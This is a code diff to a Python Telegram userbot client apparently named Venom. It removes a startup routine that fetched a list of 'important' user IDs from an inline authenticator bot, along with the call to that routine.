@@ -65,13 +65,6 @@ class CustomVenom(Methods, Client):
             name_ = one.split(".")[1]
             test.__init__(name_)
 
-    async def start_client(self) -> None:
-        """ client starter """
-        if not SecureConfig().STRING_SESSION:
-            return
-        r: BotResults = await self.get_inline_bot_results("VenomX_authenticator_bot", query="get_users_list")
-        SecureConfig().IMPORTANT_USERS = [int(one) for one in r.results[0].title.split()]
-
 
 class VenomBot(CustomVenom):
 
@@ -158,7 +151,6 @@ class Venom(CustomVenom):
     async def start(self):
         try:
             await super().start()
-            await self.start_client()
             Config.VALID_STRING_SESSION = True
             if hasattr(self, 'bot') and self.bot is not None:
                 _LOG.info(_LOG_STR, "Starting bot")
